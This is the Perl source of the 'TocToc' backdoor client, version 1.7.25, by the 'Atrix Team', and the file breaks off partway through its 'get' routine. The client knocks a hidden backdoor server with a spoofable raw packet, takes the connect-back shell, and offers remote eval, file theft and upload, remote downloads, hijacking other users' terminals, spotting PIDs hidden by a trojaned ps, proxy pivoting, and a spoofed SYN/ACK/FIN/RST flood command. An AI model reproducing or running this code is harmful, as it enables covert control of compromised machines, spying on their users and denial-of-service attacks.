   #!/usr/bin/perl
   # TocToc Client 1.7.25
   #
   #     0ldW0lf - oldwolf@atrixteam.net
   #             - old-wolf@zipmail.com
   #             - www.atrix.cjb.net
   #             - www.atrixteam.net
   #
   $SIG{WINCH} = \&winch; # So we gonna know if the
                          # terminal size has changed
   $SIG{INT}   = \&finish;
   $SIG{CHLD}  = 'IGNORE';


   # modules
   use Net::RawIP;
   use IO::Handle;
   use IO::Socket;
   use IO::Select;
   use Term::ReadKey;
   use Term::ReadLine;
   use Crypt::CBC;

   use strict;

   ############
   #   Help   #
   ############
   my %HELP;
   $HELP{get}{args}         = 2;
   $HELP{get}{about}        = "Get a file from the server.";
   $HELP{get}{help1}        = "This command opens a port to the data transfer.";
   $HELP{get}{help2}        = "Its not allowed to overwrite a file so, its checked";
   $HELP{get}{help3}        = "before the download start.";
   $HELP{get}{syntax}       = "get <remote file location> <local file location> [local bind port]";
   $HELP{get}{example}      = "get /dir/other/file /home/my_dir/file";
   $HELP{get}{callback}     = \&get;

   $HELP{sysinfo}{args}     = 0;
   $HELP{sysinfo}{about}    = "Show some information about the remote machine system.";

   $HELP{put}{args}         = 2;
   $HELP{put}{about}        = "Send a file to the server.";
   $HELP{put}{help1}        = "This commando works like the 'get' does but it";
   $HELP{put}{help2}        = "send the file instead to get. Type: help get";
   $HELP{put}{syntax}       = "put <local file location> <remote file location> [local bind port]";
   $HELP{put}{example}      = "put /home/my_dir/file /dir/other/file";
   $HELP{put}{callback}     = \&put;

   # command ping is to be implemented
   #$HELP{ping}{args}        = 1;
   #$HELP{ping}{about}       = "Works like the normal ping but it use pcap to handle the packets.";
   #$HELP{ping}{syntax}      = "ping <host/ip>";
   #$HELP{ping}{example}     = "ping www.atrixteam.net";


   # COMMAND OPEN REMOVED
   #$HELP{'open'}{args}      = 2;
   #$HELP{'open'}{about}     = "Use the server to open a connection to other host.";
   #$HELP{'open'}{help1}     = "Its a simple way to make the server connect to a host";
   #$HELP{'open'}{help2}     = "and \"redirect\" the connection to us.";
   #$HELP{'open'}{syntax}    = "open <host> <port>";
   #$HELP{'open'}{example}   = "open 127.0.0.1 80";

   # NOW OPEN2 BECAME OPEN
   $HELP{'open'}{args}      = 2;
   #$HELP{'open2'}{about}     = "Works like OPEN but it opens a local port and wait for a client.";
   $HELP{'open'}{about}     = "Open a Local server that will redirect the connection to the host.";
   $HELP{'open'}{help1}     = "The local port will wait for the server to connect and then wait";
   $HELP{'open'}{help2}     = "for a client, when the client connect the server will connect on";
   $HELP{'open'}{help3}     = "the especified host:port and will work like a PROXY.";
   $HELP{'open'}{syntax}    = "open <host> <port> [local port]";
   $HELP{'open'}{example}   = "open irc.atrixteam.net 6667";
   $HELP{'open'}{callback}  = \&sopen2;

   $HELP{clear}{args}       = 0;
   $HELP{clear}{about}      = "Clear the TocToc menu screen.";
   $HELP{clear}{callback}   = \&clear;

   $HELP{pwd}{args}         = 0;
   $HELP{pwd}{about}        = "Show the PERL working directory on the server.";

   $HELP{w}{args}           = 0;
   $HELP{w}{about}          = "Show the logged users in the TocToc and what they are doing.";
   $HELP{w}{help1}          = "This command works like the normal \"w\" but";
   $HELP{w}{help2}          = "with some changes.";

   $HELP{version}{args}     = 0;
   $HELP{version}{about}    = "Asks the server version.";

   $HELP{lag}{args}         = 0;
   $HELP{lag}{about}        = "Messure the lag between you and the server.";
   $HELP{lag}{help1}        = "Show you the time it takes to a packet be sended and";
   $HELP{lag}{help2}        = "received in microseconds.";
   $HELP{lag}{callback}     = \&lag;

   $HELP{hijack}{args}      = 1;
   $HELP{hijack}{about}     = "Hijack an opened tty.";
   $HELP{hijack}{help1}     = "All the typed stuff gonna be written in the terminal";
   $HELP{hijack}{help2}     = "so you can write commands in someone else terminal.";
   $HELP{hijack}{syntax}    = "hijack <device>";
   $HELP{hijack}{example}   = "hijack /dev/pts/1";
   $HELP{hijack}{callback}  = \&hijack;

   $HELP{attack}{args}      = 4;
   $HELP{attack}{about}     = "Attack a host.";
   $HELP{attack}{help1}     = "A flooder very similar to slice3.";
   $HELP{attack}{help2}     = "    < TYPE LIST >";
   $HELP{attack}{help3}     = "      1 - SYN";
   $HELP{attack}{help4}     = "      2 - ACK";
   $HELP{attack}{help5}     = "      3 - FIN";
   $HELP{attack}{help6}     = "      4 - RST";
   $HELP{attack}{help7}     = "      5 - All of them";
   $HELP{attack}{help8}     = "      6 - Alternate between the chosen types";
   $HELP{attack}{help9}     = " * NOTES: - You can especify more than one type";
   $HELP{attack}{help10}    = "            separating them by \",\" (coma). Ie.: 1,4,6";
   $HELP{attack}{help11}    = "          - You can use '0' to indicate random in the";
   $HELP{attack}{help12}    = "            ip src block and port range fields";
   $HELP{attack}{example}   = "attack 81.52.249.49 81.52.249 1-1024 6 99999";
   $HELP{attack}{syntax}    = "attack <dest ip> <ip src block> <port range> <type> [seconds to run]";

   $HELP{'eval'}{args}      = 1;
   $HELP{'eval'}{about}     = "Does the server evaluate a string.";
   $HELP{'eval'}{help1}     = "Is not recommended to do that unless you realy know";
   $HELP{'eval'}{help2}     = "what you are doing.";
   $HELP{'eval'}{syntax}    = "eval <perl code>";
   $HELP{'eval'}{example}   = "eval kill(9, \$\$);";

   $HELP{download}{args}    = 1;
   $HELP{download}{about}   = "Does the server download a file.";
   $HELP{download}{help1}   = "It downloads a ftp or a http link saving the file";
   $HELP{download}{help2}   = "in the PERL working directory. Type: 'help pwd' and 'help cd'";
   $HELP{download}{syntax}  = "download <URL> [file localtion]";
   $HELP{download}{example} = "download http://www.atrix.cjb.net/files/TocTocKit-last.tgz";

   $HELP{socklist}{args}    = 0;
   $HELP{socklist}{about}   = "Prints the server socklist.";
   $HELP{socklist}{help1}   = "This command is exactly the socklist program.";
   $HELP{socklist}{help2}   = "It shows infos about the programs using a socket.";
   $HELP{socklist}{help3}   = "The suppoted protocol types are: TCP, UDP and RAW.";
   $HELP{socklist}{syntax}  = "socklist [protocol]";
   $HELP{socklist}{example} = "socklist tcp";

   $HELP{leval}{args}       = 1;
   $HELP{leval}{about}      = "Does the client evaluate a string.";
   $HELP{leval}{help1}      = "Its exactly like 'eval' command but it is evaluated locally.";
   $HELP{leval}{help2}      = "Type: help eval";
   $HELP{leval}{syntax}     = "leval <perl code>";
   $HELP{leval}{example}    = "leval kill(9, \$\$);";
   $HELP{leval}{callback}   = \&leval;

   $HELP{raw}{args}         = 1;
   $HELP{raw}{about}        = "Send protocols messages.";
   $HELP{raw}{help1}        = "RAW can be usefull if the server and the client version";
   $HELP{raw}{help2}        = "are different. It sends its arguments as command.";
   $HELP{raw}{help3}        = "Not now but in the future it can be very usefull...";
   $HELP{raw}{syntax}       = "raw <command> [arguments]";
   $HELP{raw}{example}      = "raw socklist tcp";
   $HELP{raw}{callback}     = \&raw;

   $HELP{restart}{args}     = 0;
   $HELP{restart}{about}    = "Restart the server.";
   $HELP{restart}{help1}    = "The server execute itself again and exit.";

   $HELP{cd}{args}          = 1;
   $HELP{cd}{about}         = "Change the PERL working directory on the server.";
   $HELP{cd}{syntax}        = "cd <directory>";
   $HELP{cd}{example}       = "cd /";

   $HELP{ps}{args}          = 0;
   $HELP{ps}{about}         = "Show remote hidden PIDs.";
   $HELP{ps}{help1}         = "This command execute 'ps ax' on the server and compare";
   $HELP{ps}{help2}         = "the result with the PIDs /proc and show you the hidden";
   $HELP{ps}{help3}         = "PIDs by the trojaned ps.";

   $HELP{shell}{args}       = 0;
   $HELP{shell}{about}      = "Take you back to the shell prompt.";

   $HELP{'exit'}{args}      = 0;
   $HELP{'exit'}{about}     = "Close the connection and exit the program.";
   $HELP{'exit'}{callback}  = \&exit_cmd;

   $HELP{help}{args}        = 0;
   $HELP{help}{callback}    = \&ShowHelp;

   # manualy sorting the commands for help stuff
   my @commands = ("PUT", "GET", "DOWNLOAD", "LAG",
                   "ATTACK",
   #                "PING",
                   "EVAL", "LEVAL",
                   "CD", "PWD", "CLEAR",
                   "SOCKLIST","HIJACK",
                   "PS","W",
   #                "OPEN", "OPEN2",
                   "OPEN",
                   "RESTART",
                   "RAW",
                   "VERSION",
                   "SHELL",
                   "EXIT");


   my $dest = $ARGV[0];
   @ARGV = @ARGV[1 .. $#ARGV] if ($dest =~ /\./);
   undef($dest) unless ($dest =~ /\./);

   my %opt = getopts(
                      idproto => "PT|id-proto,:",
                   iddestport => "DP|id-dest-port,n",
                      idsrcip => "IP|id-src-ip,i",
                    idsrcport => "SP|id-src-port,n",

                       idssip => "ip|serv-ip,i",
                     idssport => "sp|serv-src-port,n",

                   idprotosip => "pip|proto-src-ip,i",
                 idprotosport => "psp|proto-src-port,n",

                        pudpp => "B|proto-udp-port,n",
                     bindport => "b|bind,n",

                         type => "IT|icmp-type,n",
                         code => "IC|icmp-code,n",

                         idnc => "NC|no-size-check",
                          num => "n|n-packets,n",

                       ncrypt => "nc|no-crypt",
                          key => "k|crypt-key,:",
                         bits => "K|key-bits,n",

                       fucked => "f|fuked-mode",
                        shell => "s|shell,:",

                         help => "h|help",
                         advh => "H|advanced-help",
                     password => "pass|password,:",
                        rexec => "e|exec,:",
                         conn => "c|connect",
                         myip => "m|my-ip,i",
                      timeout => "t|timeout,n",
                        proto => "p|proto,:"

                    );

   my $iflist = ifaddrlist;
   my $found_my_ip;

   if ($dest) {
     unless ($dest =~ /^\d+\.\d+\.\d+\.\d+$/) {
       my $resolve = join('.',unpack('C4',(gethostbyname($dest))[4]));
       unless($resolve) {
         finish("Error: Could not resolve $dest\n");
       }
       $dest = $resolve;
     }

     $found_my_ip = $iflist->{rdev($dest)}; # yeah.. great idea

     unless ($found_my_ip) {
       foreach my $iface (("ppp0", "ppp1", "eth0", "eth1")) {
         if (defined($iflist->{$iface})) {
           $found_my_ip = $iflist->{$iface};
           last;
         }
       }

       # dunno what to do... random!
       map { $found_my_ip = $iflist->{$_} } keys %$iflist
         unless ($found_my_ip);
     }
     unless ($found_my_ip) {
       out("Local IP not found exiting!\n");
       exit(1);
     }
   }


   # Some defines
   my %IDPACKET;
   my $pudpp              = $opt{pudpp} || int(rand(65535));
   my $protocol           = lc($opt{proto} || "TCP");
   $IDPACKET{dport}       = $opt{iddestport} || int(rand(65535));
   $IDPACKET{sport}       = $opt{idsrcport} || int(rand(65535));
   $IDPACKET{proto}       = $opt{idproto} || "TCP";
   $IDPACKET{sip}         = $opt{idsrcip} || $found_my_ip;
   $IDPACKET{ssip}        = $opt{idssip};
   $IDPACKET{ssport}      = $opt{idssport};
   $IDPACKET{psip}        = $opt{idprotosip};
   $IDPACKET{psport}      = $opt{idprotosport};
   $IDPACKET{pudpp}       = $opt{pudpp} || $pudpp;
   $IDPACKET{icmp_type}   = $opt{type} || 8;
   $IDPACKET{icmp_code}   = $opt{code} || 0;
   my $password           = $opt{password};
   my $TIMEOUT            = $opt{timeout} || 10;
   my $my_ip              = $opt{myip};
   my $lport              = $opt{bindport};
   my $key                = $opt{key} || gen_key(($opt{bits} || 128));
   my $shell_hist_max     = 45; # you can change that but dont need
   my $prompt             = 'TocToc> ';
   my $VERSION            = '1.7.25';
   my $clear              = `clear`;
   my %SHELL_HIST;
   my $shell_hist_counter = 1;
   my $menu_act           = 0;
   my $buffer             = 1024;
   my $lbuffer            = 4096;
   my @protocols          = ('tcp', 'udp', 'icmp');
   my (%BUF, $BUF)        = ('', '');
   my $EOC                = "\001\004\003\002"; # END OF CRYPT string
   my $got_first_udp      = 0;
   my $UDP_DELAY          = 0.2;
   my $id_string_size     = $opt{idsize} || 1024;

   $IDPACKET{dport} = $IDPACKET{sport} = 0
     if (lc($IDPACKET{proto}) eq "icmp");

   if (not defined($dest) or defined($opt{help}) or defined($opt{advh}) or $dest !~ /\./) {
     out("               TocToc Client $VERSION\n\n");
     out("    Atrix Team\n\n");
     out("        0ldW0lf - old-wolf\@zipmail.com\n");
     out("                - oldwolf\@atrixteam.net\n");
     out("                - www.atrixteam.net\n");
     out("                - www.atrix.cjb.net\n\n");
     out(" Usage: $0 <ip/host> [options]\n\n");
     out("        [OPTIONS]\n\n");
     out("  -p, --proto            <> Server/client communication protocol (TCP, UDP).\n");
     out("                            Default is TCP\n");
     out("  -b, --bind             <> Local port to be binded. Used in TCP and UDP\n");
     out("                            protocols\n");
     out("  -B, --proto-udp-port   <> Local port to be binded for the TocToc Protocol\n");
     out("                            connection when using UDP protocol\n");
     out("  -t, --timeout          <> Max time in seconds to wait for the connection.\n");
     out("                            Default is 10\n");
     out("  -c, --connect          <> Connect on the remote box before sending the\n");
     out("                            identification string. Use that if you aren't root\n");
     out("  -n, --n-packets        <> Number of identification packets to be sent.\n");
     out("                            Default is 1\n");
     out("  -e, --exec             <> Tell the server to execute a command not open a\n");
     out("                            connection\n");
     out("  -f, --fucked-mode      <> Don't execute a shell use a TocToc prompt to\n");
     out("                            execute the commands instead of the shell\n");
     out("  -s, --shell            <> Remote shell to be executed instead of the default\n");
     out("                            one\n");
     out("  -pass, --password      <> Server password, if not specified you gonna be\n");
     out("                            prompted\n");
     out("  -nc, --no-crypt        <> Don't use cryptation\n");
     out("  -H, --advanced-help    <> Show all the options including the advanced one\n");
     if (defined($opt{advh})) {
       out("\n    [ADVANCED OPTIONS]\n\n");
       out("  -sp, --serv-src-port   <> Server source port to  connect on the client\n");
       out("  -ip, --serv-ip         <> Sever source IP address to connect on the client\n");
       out("  -psp, --proto-src-port <> Server source port to connect on the client for\n");
       out("                            the TocToc Protocol use\n");
       out("  -pip, --proto-src-ip   <> Server source IP address to connect on the client\n");
       out("                            for the TocToc Protocol use\n");
       out("  -PT, --id-proto        <> Identification packet protocol (ICMP, UDP, TCP).\n");
       out("                            Default is TCP\n");
       out("  -DP, --id-dest-port    <> Identification packet destination port\n");
       out("  -IP, --id-src-ip       <> Identification packet source IP\n");
       out("  -SP, --id-src-port     <> Identification packet source port\n");
       out("  -IT, --icmp-type       <> Identification packet ICMP type when using ICMP\n");
       out("                            protocol. Default is 8\n");
       out("  -IC, --icmp-code       <> Identification packet ICMP code when using ICMP\n");
       out("                            protocol. Default is 0\n");
       out("  -NC, --no-size-check   <> Don't check the size of the ID packet data.\n");
       out("  -K, --key-bits         <> Bits of the gerated cryptation key. Default is 128\n");
       out("                            bits\n");
       out("  -k, --crypt-key        <> Encryptation key\n");
       out("  -m, --my-ip            <> Your real IP (use if you are behind a firewall or\n");
       out("                            spoofing the Identification packet IP)\n");
     }

     out("\n\n * In normal cases none options are needed.\n");
     my @st = stat("README");
     out(" * If I were you I would read the README anyway ;)\n") if (@st and $st[8] == $st[10]);
     out("\n");
     exit 1;
   }

   ############################
   #  Wrong syntax messages  #
   ############################
   if (defined($opt{UNKNOWN})) {
     $opt{UNKNOWN} =~ s/\|/, /g;
     out("Unknown option(s): ".$opt{UNKNOWN}."\n");
     out("Type (perl) $0 --help\n\n");
     exit(1);
   }
   if (defined($opt{MISS_VALUE})) {
     $opt{MISS_VALUE} =~ s/\|/, /g;
     out("The option(s) requires some value: ".$opt{MISS_VALUE}."\n");
     out("Type (perl) $0 --help\n\n");
     exit(1);
   }
   if (defined($opt{WRONG_VALUE})) {
     out("Unacceptable value for options:\n\n");
     foreach my $opt_value (split(/\|/, $opt{WRONG_VALUE})) {
       $opt_value =~ /^(.*)\,(.*?)$/;
       out(fill_space($1, 7)."  -  ");
       out("Value should be a number.") if ($2 =~ /n/);
       out("Value should be an IP address.") if ($2 =~ /i/);
       out("\n");
     }
     out("\n");
     exit(1);
   }
   if($> and !$opt{conn}) {
     out("You are not root, you must use '--connect' option.\n");
     exit(1);
   }
   if ($opt{key} and $opt{bits}) {
     out("You can't use '--key-bits' and '--crypt-key' together.\n");
     exit(1);
   }
   if (lc($opt{idproto}) ne "icmp" and ($opt{code} or $opt{type})) {
     out("You are not using UDP as ID packet protocol.\nCan't use '--icmp-type' and '--icmp-code' options.\n");
     exit(1);
   }

   if ($opt{pudpp} and $protocol ne "udp") {
     out("You are not using UDP protocol.\nCan't use '--proto-udp-port' option.\n");
     exit(1);
   }
   if (defined($opt{conn}) and ($protocol ne "tcp" and $protocol ne "udp")) {
     out("Option '--connect' can only be set in TCP and UDP protocols\n");
     exit(1);
   }
   unless ( grep { $_ eq lc($IDPACKET{proto}) } @protocols ) {
     out("Identification packet protocol \'$IDPACKET{proto}\' not supported!\n");
     out("The supported protocols are ".uc(join(', ', @protocols)).".\n");
     exit(1);
   }
   unless ( grep { $_ eq $protocol } ("udp", "tcp") ) {
     out("Communication protocol \'$protocol\' not supported!\n");
     out("The supported protocols are TCP, UDP.\n");
     exit(1);
   }
   if (lc($IDPACKET{proto}) eq "icmp" and (defined($opt{idsrcport}) or defined($opt{iddestport}))) {
     out("You cannot especify ports on protocol ICMP.\n");
     exit(1);
   }

   # changing process name.. we don't want our passwords
   # to be shown up in ps.. do we?
   my $proc = "$0 $dest @ARGV";
   $proc =~ s/(-|--)(pass|password)(=|\s+)\S+/$1$2$3******/g;
   $0 = $proc."\0";


   # initializing ourselves
   my $sel = IO::Select->new();
   my $toctoc = Term::ReadLine->new("TocToc Client $VERSION");

   my @term_size = GetTerminalSize(\*STDIN);
   my $sel_transfer = IO::Select->new();
   STDOUT->autoflush(1);

   my $cipher = new Crypt::CBC($key, 'DES_EDE3');

   ###################################
   #  Connecting to backdoor server  #
   ###################################

   die("Could not bind on port: $!") unless($lport = TestBindPort($lport));
   die("Could not bind on port: $!") if(!($pudpp = TestBindPort($pudpp)) and $protocol eq "udp" );


   ReadMode 2; # turns off echo
   if (!$password) {
     out("Password: ");
     chop($password = <STDIN>);
   }
   ReadMode 0; # normal mode
   out("\r");

   my $rexec = $opt{rexec};
   $rexec =~ s/ /\001/g;
   my ($bind, $proto_sock, $show_dport, $show_sport);

   my $show_ssport = $IDPACKET{ssport} || "(any)";
   my $show_psport = $IDPACKET{psport} || "(any)";

   my $TTP_PROTO = ($rexec? "TTP_$rexec" : $protocol);

   my $id_string = ":$my_ip:$lport:".$IDPACKET{pudpp}.":".$IDPACKET{ssip}.":".$IDPACKET{ssport}.":".$IDPACKET{psip}.":".$IDPACKET{psport}.":$TTP_PROTO:".($opt{fucked}?'f_':'').($opt{shell}?"s$opt{shell}_":'').":".($opt{ncrypt} ? "00" : "").length($key)." ".$key.($cipher->encrypt($password)).":";

   my $idlen = length($id_string);
   if ($idlen > 1024 and !defined($opt{idnc})) {
     out("The identification string of the ID Packet is too long ($idlen > 1024 bytes).\n");
     out("Try to change:\n");
     out("  - Command size (actualy ".length($opt{rexec})." chars)\n") if ($rexec);
     out("  - Key bits (actualy ".$opt{bits}." bits or ".(int($opt{bits}/8))." bytes)\n") if (defined($opt{bits}));
     out("  - Encryptation key (actualy ".length($opt{key})." bytes)\n") if (defined($opt{key}));
     out("You also can use the '-NC' option to ignore it :)\n");
     exit(1);
   }


   if (lc($IDPACKET{proto}) ne "icmp") {
     $show_dport = ":".$IDPACKET{dport};
     $show_sport = ":".$IDPACKET{sport};
   }


   if (not defined($opt{rexec})) {
     out("Binding on port: $lport/".uc($protocol)."\n");
     out("Binding on port: $pudpp/UDP\n") if ($protocol eq "udp");
     out("\n");

     # binding port
     if ($protocol eq "tcp") {
        $bind = IO::Socket::INET->new(Listen=>1, LocalPort =>"$lport" ,Proto => 'tcp', Timeout=>$TIMEOUT) || die "Could not listen on port $lport/TCP: $!";
     } else {
         $bind = IO::Socket::INET->new(LocalPort => "$lport", Proto => "udp", Timeout => $TIMEOUT) || die "Could not bind port $lport/UDP: $!";
         $proto_sock = IO::Socket::INET->new(LocalPort => "$pudpp", Proto => "udp", Timeout => $TIMEOUT) || die "Could not bind port $pudpp/UDP: $!";
     }


   }

   unless ($opt{conn}) {
     out("Sending packet: [From $IDPACKET{sip}"."$show_sport "."To $dest"."$show_dport Protocol: ".uc($IDPACKET{proto})."]\n");

     send_packet(     saddr => $IDPACKET{sip},
                      daddr => $dest,
                      proto => $IDPACKET{proto},
                     source => $IDPACKET{sport},
                    'times' => ($opt{num} || 1),
                      delay => ($opt{num} ? 1:-1),
                  icmp_type => $IDPACKET{icmp_type},
                  icmp_code => $IDPACKET{icmp_code},
                       dest => $IDPACKET{dport},
                       data => "$id_string" );
   } else {
      out("Connecting:     [Host $dest Port $IDPACKET{dport} Protocol: ".uc($IDPACKET{proto})."]\n");
      my $csock = IO::Socket::INET->new(PeerAddr=> $dest, PeerPort => $IDPACKET{dport}, Proto => $protocol);
      unless ($csock) {
        out("I could not connect on $dest:$IDPACKET{dport}\n");
        exit(1);
      } else {
          out("Sending ID:     ");
          $csock->send($id_string);
          sleep(1);
          shutdown($csock, 2);
          out("[ OK ]\n");
      }
   }

   if (defined($opt{rexec})) {
     out("Executation string sended (exec: $opt{rexec})\n");
     exit 0;
   }

   out("Waiting Server: [From ".($IDPACKET{ssip} || $dest).":$show_ssport On ".( $my_ip || $IDPACKET{sip}).":$lport Protocol: ".uc($protocol)."]\n");
   out("Waiting TTP:    [From ".($IDPACKET{psip} || $dest).":$show_psport On ".( $my_ip || $IDPACKET{sip}).":".($protocol eq "tcp" ? $lport : $pudpp)." Protocol: ".uc($protocol)."]\n");


   my $sock;
   my $icount = time;
   out("\nWaiting for the connections...\r");
   unless (is_ready($bind)) {
     while (!is_ready($bind, 1)) {
       my $dcount = time-$icount;
       out("Waiting for the connections... [ giving up in ".($TIMEOUT-$dcount)." seconds ]".(" " x 10)."\r");
       finish("\nServer didn´t connect!\n") if(($TIMEOUT-$dcount) <= 0);
     }
   }
   my $sock = 1;
   $sock = $bind->accept() if ($protocol eq "tcp");
   finish("\nServer didn´t connect!\n") unless($sock);
   $sel->add($bind);

   if ($protocol eq "tcp") {
     $sock->autoflush(1);
     $sel->add($sock);
   } else {
      $bind->autoflush(1);
      $proto_sock->autoflush(1);
      out("\n\rWaiting TocToc Protocol first message... ");

      $got_first_udp = is_ready($proto_sock, 10);
      if ($got_first_udp) {
        my $garb;
        $proto_sock->recv($garb, $buffer);
        out("OK!\n");
        spm("TERM_SIZE @term_size") if (defined(@term_size));
      } else {
          out("FAILED\n");
      }

   }


   STDIN->autoflush(1);
   $sel->add(\*STDIN);
   ReadMode 4; # give us control of the typed keys

   out("\n\nOK! We are in.\n");
   out("Menu char: ^H\n\n");



   ###################
   #  Our main loop  #
   ###################

   while ( 1 ) {

     my @ready = $sel->can_read(0.01);
     foreach my $fh (@ready) {
       my ($nread, $msg);

       if ($protocol eq "tcp" or $fh eq \*STDIN) {
         $nread = sysread($fh, $msg, $buffer);
       } else {
          $nread = $bind->recv($msg, $buffer);
       }

       if ($fh eq $bind and $protocol eq "tcp") {
         # the socket which we gonna send/receive the protocols menssages
         $proto_sock = $bind->accept();
         $sel->remove($bind); # we can stop binding
         $bind->close();      #
         spm("TERM_SIZE @term_size") if (defined(@term_size));
       } elsif (($fh eq $sock and $protocol eq "tcp") or ($fh eq $bind and $protocol eq "udp")) {
           if ($nread == 0 and $protocol eq "tcp") {
             finish("\nDesconnected!\n");
           } else {
               $BUF .= $msg;
               if ($opt{ncrypt} == 1) {
                  write_out($BUF);
                  $BUF='';
               } else {
                  my $crpt_msg;
                  ($crpt_msg, $BUF) = get_crypt($BUF);

                  while ( $crpt_msg ) {
                    my $decrypt = $cipher->decrypt($crpt_msg); # || die "erro desencrypt";
                    write_out($decrypt);
                    ($crpt_msg, $BUF) = get_crypt($BUF);
                  }
               }
           }
       } else { # STDIN
           if (ord($msg) == 8) { # ^H
               active_menu();
           } else {
               write_sock($msg);
           }
       }
     }
   }


   ####################
   #       SUBS       #
   ####################

   sub get_crypt {
     my $msg = shift;

     return(undef, $msg) unless ($msg =~ /$EOC/);

     my @crypt_msgs = split("$EOC", $msg);
     my $crypt_msg = $crypt_msgs[0];

     my $new_msg;
     if ($#crypt_msgs > 0) {
       $new_msg = join("$EOC", @crypt_msgs[1 .. $#crypt_msgs]);
       $new_msg .= "$EOC" if ($msg =~ /$EOC$/);
     }

     return($crypt_msg, $new_msg);
   }


   ###############
   #    MENU     #
   ###############
   sub active_menu {
     $sel->remove(\*STDIN);
     ReadMode 0;
     $menu_act = 1;
     clear();
     out("Type help to list the commands.\n\n");
     menu();
   }

   sub desactive_menu {
     $menu_act = 0;
     $sel->add(\*STDIN);
     ReadMode 4;
     clear();
     show_shell_buff();
   }

   sub menu {
     $SIG{INT} = \&finish;

     ReadMode 0;
     while( defined (my $line = $toctoc->readline($prompt)) ) {

       if (lc($line) eq "shell") {
         &desactive_menu;
         return;
       } else {
           ReadMode 4;
           parse_cmd($line) if ($line =~ /\S/);
           ReadMode 0;
       }

     }
   }


   #####################
   #  TocToc Commands  #
   #####################
   sub parse_cmd {
     my $cmd = shift;

     my (@args, $arg);
     $cmd =~ s/^\s+//;

     if ($cmd =~ /^(.+?)\s+(.*)/) {
       $cmd = lc($1);
       $arg = $2;
       @args = split(/ +/, $arg);
     } else {
        $cmd = lc($cmd);
     }

     unless (defined($HELP{$cmd})) {
       out("$cmd: command not found.\n");
       return(undef);
     }

     if (scalar(@args) < $HELP{$cmd}{args}) {
       HelpCMD($cmd);
       return(undef);
     }

     if (defined($HELP{$cmd}{callback})) {
       &{$HELP{$cmd}{callback}}(@args);
     } else {
         ask_cmd(uc($cmd), $arg);
     }
   }

   sub ask_cmd {
      my ($cmd, $arg) = @_;
      if (($protocol eq "tcp" and !defined($proto_sock)) or
          ($protocol eq "udp" and !$got_first_udp)) {
         out("Error: The protocol connection is not estabilished!\n");
         out("       Try to reconnect.\n");
         return;
      }

      $arg = "0" unless($arg);

      fhread($proto_sock); # flushing
      spm("$cmd $arg");

      my $res = '';

      my $sel_ask = IO::Select->new($proto_sock);
      $sel_ask->add(\*STDIN);
      while ( 1 ) {
         foreach my $fh ($sel_ask->can_read(0.1)) {
           my ($nread, $msg);
           if ($protocol eq "tcp" or $fh eq \*STDIN) {
             $nread = sysread($fh, $msg, $lbuffer);
           } else {
              $nread = $fh->recv($msg, $buffer);
           }

           if ($fh eq $proto_sock) {
             if ($nread == 0 and $protocol eq "tcp") {
               out("\n\nProtocol socket has been closed by peer!\n\n");
               $sel_ask->remove();
               return();
             }
             my $unparsed = $res.$msg;
             while($unparsed =~ /\001T:(\S+)\s(.+?):\002\n/) {
               my $got_cmd = $1;
               my $got_args = $2;
               $unparsed =~ s/\001T:$got_cmd\s.+?:\002\n//;

               if (lc($got_cmd) ne lc($cmd)) {
                 # answer of aborted commands...
                 next;
               } elsif (!parse_ans($got_cmd, $got_args)) {
                  return(1);
               }
             }
             $res = $unparsed;
           } else {
              if (ord($msg) == 3) {
                $sel_ask->remove();
                spm("$cmd ABORT");
                out("\nOperation aborted!\n\n");
                ShutDownTransfer();
                return();
              }
           }
         }

      }
   }

   sub parse_ans {
     my ($cmd, $ans) = @_;

     return(undef) if ($ans eq "DONE");
     if ($ans =~ /Error\:/) {
       out("$ans\n");
     } elsif ($cmd eq "DOWNLOAD") {
        if ($ans =~ /^\r/) {
          out($ans);
        } else {
           out("$ans\n");
        }
     } elsif ($cmd eq "LAG") {
        my $time = timem();
        my $lag = $time-$ans;
        out("Lag: $lag microsec\n");
     } else {
         out("$ans\n");
     }
     return(1);
   }

   #################
   # COMMANDS SUBS #
   #################
   sub lag { ask_cmd("LAG", timem()); }
   sub exit_cmd { finish("Exiting...\n", $clear."C ya!\n"); }
   sub leval { out("Evaluation returned: ".(eval "@_")."\n"); }
   sub raw { ask_cmd(uc($_[0]), join(' ', @_[1 .. $#_])); }


   sub sopen2 {
     my ($ip, $rport, $localport) = @_;

     my $port = TestBindPort($localport);

     unless ($port) {
       out("Could not listen on port $localport\n");
       return();
     }

     my $open2 = IO::Socket::INET->new(Listen => 1, LocalPort => $port, Proto => "tcp", Timeout => $TIMEOUT);
     unless($open2) {
       out("Freak error binding on port $port\n");
       return();
     }

   #  spm("OPEN2 $ip $rport $port");
     spm("OPEN $ip $rport $port");

     out("Waiting for the server...\n");

     my $open_serv = $open2->accept();
     unless($open_serv) {
       out("Operation timed out! Server didn't connect.\n");
       return();
     }
     out("Server connected.\n");

     my $pid = fork();

     if (not defined($pid)) {
       out("Error on fork()\n");
       return();
     }

     unless ($pid) {
       my $sel = IO::Select->new($open2);
       $sel->add($open_serv);
       $open_serv->autoflush(1);
       my $client;

       while ( 1 ) {
         foreach my $fh ($sel->can_read(0.1)) {
           my $msg;
           my $nread = sysread($fh, $msg, $lbuffer);
           if ($nread == 0 and $fh ne $open2) {
              $open2->close();
              $client->close()    if ($client);
              $open_serv->close() if ($open_serv);

              $sel->remove();
              undef($sel);
              exit;
           }

           if ($fh eq $open2) {
             $client = $open2->accept();
             $client->autoflush(1);
             $sel->add($client);
             print $open_serv "GO GO GO\n";
           } elsif ($fh eq $open_serv) {
               syswrite($client, $msg, length($msg));
           } elsif ($fh eq $client) {
               syswrite($open_serv, $msg, length($msg));
           }
         }
       }
     }

     out("OK! Running in background.\n");
     out("Local port: $port\n");

   }

   sub hijack {
     my $dev = shift;

     ReadMode 4;
     out("Type ^H (Ctrl+H) to exit.\n");
     print "[$dev]> ";

     my $msg;

     while( sysread(STDIN, $msg, $lbuffer) ) {
       last if(ord($msg) == 8);

       if (ord($msg) == 127) {
         out("<BACKSPACE>");
       } else {
          out($msg);
       }

       $msg =~ s/\n/\001/g;
       $msg =~ s/ /\002/g;
       ask_cmd("HIJACK", "$dev ".$msg);
       print "[$dev]> " if ($msg =~ /\001/);

     }
     ReadMode 0;
     print "\n";
   }


   sub get {
     my ($remote_file, $local_file, $bind_port) = @_;

     if (-e "$local_file" and (stat("$local_file"))[7] > 0) {
       out("File ($local_file) already exist.\n");
       return(undef);
     }

     unless(open(FILE, "> $local_file")) {
       out("Could not open file ($local_file) for writting.\n");
       return(undef);
     }

     return(undef) unless (my $port = TestTransferPort($bind_port));

     return(undef) unless (SetUpTransfer($port, "GET $remote_file $port"));

